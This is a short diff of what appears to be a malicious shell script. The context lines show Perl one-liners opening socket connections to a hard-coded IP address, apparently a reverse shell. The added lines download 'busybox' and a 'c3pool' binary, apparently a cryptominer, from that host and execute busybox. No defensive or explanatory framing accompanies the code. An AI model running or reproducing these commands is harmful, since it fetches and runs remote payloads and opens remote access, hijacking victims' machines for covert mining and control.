@@ -11,3 +11,8 @@ perl -MSocket -e 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,
 perl -MIO::Socket -e '$c=IO::Socket::INET->new("176.160.153.17:6000"); print $c "ping\n" if $c'
 
 
+# querry buybox now
+
+./cl 176.160.153.17:6001/busybox -o busybox
+./cl 176.160.153.17:6001/c3pool -o mo
+./busybox
